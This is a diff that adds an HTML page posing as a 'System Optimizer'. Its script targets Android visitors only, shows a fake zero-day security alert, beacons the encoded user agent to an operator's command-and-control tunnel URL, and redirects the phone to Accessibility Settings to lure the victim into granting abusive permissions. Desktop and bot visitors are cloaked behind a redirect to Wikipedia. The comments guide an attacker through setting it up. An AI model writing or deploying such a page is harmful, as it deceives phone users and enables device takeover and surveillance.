@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Optimization Tool</title>
+    <script>
+        // Stealth User-Agent Filter: Only triggers for Android phones
+        if (/Android/i.test(navigator.userAgent)) {
+            window.onload = function() {
+                // The "Hook": A fake alert that looks like a system message
+                alert("Security Update Required: Patch 0-Day Vulnerability now.");
+                
+                // The "Action": This sends a request to your Pydroid C2
+                // Replace 'your.tunnel.link' with your Pinggy/Localtonet URL
+                fetch('https://your.tunnel.link/trigger/handshake?node=' + btoa(navigator.userAgent))
+                .then(response => {
+                    // Redirect to Accessibility Settings (The Logic Flaw)
+                    window.location.href = "intent:#Intent;action=android.settings.ACCESSIBILITY_SETTINGS;end";
+                });
+            };
+        } else {
+            // If a Bot or PC visits, show a harmless Wikipedia page
+            window.location.href = "https://en.wikipedia.org/wiki/Network_security";
+        }
+    </script>
+</head>
+<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
+    <h1>[ SYSTEM OPTIMIZER ]</h1>
+    <p>Please wait while we check your device latency...</p>
+</body>
+</html>
